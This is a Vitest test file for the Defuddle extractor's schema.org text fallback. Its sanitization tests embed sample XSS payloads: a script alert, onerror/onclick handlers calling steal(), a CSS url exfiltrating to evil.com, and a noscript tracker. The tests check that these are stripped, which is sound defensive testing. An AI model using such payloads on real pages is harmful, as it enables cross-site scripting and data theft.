import { describe, test, expect } from 'vitest';
import { JSDOM } from 'jsdom';
import Defuddle from '../src/index';

function createDocument(html: string): Document {
	const dom = new JSDOM(html);
	return dom.window.document;
}

/**
 * Tests for the schema.org text fallback path in parse().
 *
 * When schema.org structured data contains more text (via `text` or
 * `articleBody`) than the content scorer extracted, defuddle searches
 * the DOM for the element matching the schema text and returns its HTML.
 */
describe('Schema.org text fallback', () => {
	test('uses schema text when it has more words than extracted content', () => {
		// Short visible article + longer schema.org text → fallback triggers
		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test Post</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "This is a much longer post body that contains significantly more words than the short article element. It goes on and on with additional sentences to ensure the word count exceeds the extracted content. Here is even more text to make absolutely sure we cross the threshold. The schema text fallback should kick in when this text is longer than what the scorer found."
			}
			</script>
		</head>
		<body>
			<nav><a href="/">Home</a></nav>
			<div id="feed">
				<div class="post" id="other-post">
					<p>Some other post in the feed that is not what we want.</p>
				</div>
				<div class="post" id="target-post">
					<p>This is a much longer post body that contains significantly more words than the short article element. It goes on and on with additional sentences to ensure the word count exceeds the extracted content. Here is even more text to make absolutely sure we cross the threshold. The schema text fallback should kick in when this text is longer than what the scorer found.</p>
				</div>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('This is a much longer post body');
		expect(result.content).toContain('schema text fallback should kick in');
	});

	test('uses articleBody from schema.org data', () => {
		const articleBody = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Article Page</title>
			<script type="application/ld+json">
			{
				"@type": "Article",
				"articleBody": "${articleBody}"
			}
			</script>
		</head>
		<body>
			<header><h1>My Blog</h1></header>
			<main>
				<article>
					<p>${articleBody}</p>
				</article>
			</main>
			<footer>Copyright 2024</footer>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('Lorem ipsum dolor sit amet');
		expect(result.content).toContain('fugiat nulla pariatur');
	});

	test('does not use schema fallback when extracted content has more words', () => {
		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Good Extraction</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "Short schema text."
			}
			</script>
		</head>
		<body>
			<article>
				<h1>Full Article</h1>
				<p>This article has plenty of content that the scorer will extract correctly. It contains multiple paragraphs with enough words to exceed the schema text length. The content scorer should pick this up as the main content without needing the schema fallback.</p>
				<p>Here is another paragraph with even more content to make the word count higher. We want to ensure the extracted content exceeds the schema text word count so the fallback does not trigger.</p>
				<p>And a third paragraph for good measure, with additional words and sentences to pad out the content even further beyond what the schema text contains.</p>
			</article>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		// Should use the normally extracted content, not the short schema text
		expect(result.content).toContain('Full Article');
		expect(result.content).toContain('multiple paragraphs');
	});

	test('falls back to schema text string when no DOM element matches', () => {
		// Schema text that does NOT appear in the DOM at all
		const schemaText = 'This unique schema text does not appear anywhere in the visible DOM body content. It has enough words to trigger the fallback path. We need quite a few words here to exceed the extracted content word count. Adding more sentences to be safe and ensure we trigger the right code path.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>No Match Page</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${schemaText}"
			}
			</script>
		</head>
		<body>
			<div>
				<p>Tiny content.</p>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		// When no DOM match, the raw schema text is used
		expect(result.content).toContain('unique schema text does not appear');
	});

	test('schema fallback finds the smallest matching element', () => {
		const postText = 'This is the target post content with enough words to trigger the schema text fallback mechanism. It needs to be long enough that its word count exceeds whatever the scorer extracted from the page. Adding more sentences here to pad the word count sufficiently.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Feed Page</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${postText}"
			}
			</script>
		</head>
		<body>
			<div id="wrapper">
				<div id="feed">
					<div class="post">
						<p>First post in the feed with different content entirely.</p>
					</div>
					<div class="post" id="target">
						<p>${postText}</p>
					</div>
					<div class="post">
						<p>Third post with yet more different content.</p>
					</div>
				</div>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		// Should match the target post, not the larger wrapper
		expect(result.content).toContain('target post content');
		// Should NOT include other posts
		expect(result.content).not.toContain('First post in the feed');
		expect(result.content).not.toContain('Third post with yet more');
	});

	test('schema fallback preserves inline formatting in matched element', () => {
		const plainText = 'This post has formatted content with bold text and italic text and a link to example site. It needs enough words to trigger the schema fallback path so we keep adding more content here.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Formatted Post</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${plainText}"
			}
			</script>
		</head>
		<body>
			<div>
				<p>Nav item</p>
			</div>
			<div class="post">
				<p>This post has <strong>formatted content</strong> with <em>bold text</em> and <em>italic text</em> and a <a href="https://example.com">link to example site</a>. It needs enough words to trigger the schema fallback path so we keep adding more content here.</p>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		// Should preserve HTML formatting
		expect(result.content).toContain('<strong>formatted content</strong>');
		expect(result.content).toContain('href="https://example.com');
	});
});

describe('Schema.org text fallback sanitization', () => {
	test('strips script tags from schema fallback content', () => {
		const postText = 'This is a social media post with enough words to trigger the schema text fallback path. We need the word count to exceed what the content scorer extracts from the page so the fallback kicks in and searches the DOM.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${postText}"
			}
			</script>
		</head>
		<body>
			<div class="post">
				<p>${postText}</p>
				<script>alert('xss')</script>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('social media post');
		expect(result.content).not.toContain('<script');
		expect(result.content).not.toContain('alert');
	});

	test('strips event handlers from schema fallback content', () => {
		const postText = 'This post contains an image with a malicious event handler that should be stripped during the schema text fallback. Adding more words here to ensure we exceed the extracted content word count threshold.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${postText}"
			}
			</script>
		</head>
		<body>
			<div class="post">
				<p>${postText}</p>
				<img src="x.jpg" onerror="alert('xss')" onclick="steal()">
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('malicious event handler');
		expect(result.content).not.toContain('onerror');
		expect(result.content).not.toContain('onclick');
		expect(result.content).not.toContain('alert');
		expect(result.content).not.toContain('steal');
	});

	test('strips style elements from schema fallback content', () => {
		const postText = 'This post has an embedded style element that could be used for CSS-based attacks or data exfiltration. We need enough words here to trigger the schema text fallback mechanism.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${postText}"
			}
			</script>
		</head>
		<body>
			<div class="post">
				<style>.secret { background: url('https://evil.com/steal?data=123') }</style>
				<p>${postText}</p>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('embedded style element');
		expect(result.content).not.toContain('<style');
		expect(result.content).not.toContain('evil.com');
	});

	test('strips noscript elements from schema fallback content', () => {
		const postText = 'This post contains a noscript element with potentially dangerous content that should be removed during sanitization. More words to trigger the fallback path reliably.';

		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "${postText}"
			}
			</script>
		</head>
		<body>
			<div class="post">
				<p>${postText}</p>
				<noscript><img src="https://evil.com/track"></noscript>
			</div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		expect(result.content).toContain('noscript element');
		expect(result.content).not.toContain('<noscript');
		expect(result.content).not.toContain('evil.com');
	});

	test('schema text string fallback does not contain HTML injection', () => {
		// Schema text that contains HTML but no DOM match exists
		const html = `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Test</title>
			<script type="application/ld+json">
			{
				"@type": "SocialMediaPosting",
				"text": "Safe text with enough words to trigger fallback. <script>alert('xss')<\\/script> More text here to pad the word count above the threshold of what the scorer extracts from the tiny body."
			}
			</script>
		</head>
		<body>
			<div><p>Tiny.</p></div>
		</body>
		</html>`;

		const doc = createDocument(html);
		const defuddle = new Defuddle(doc);
		const result = defuddle.parse();

		// The raw schema text is used as content — verify it doesn't execute
		// (schema text is plain text, not DOM HTML, so script tags are literal text)
		expect(result.content).toContain('Safe text');
	});
});
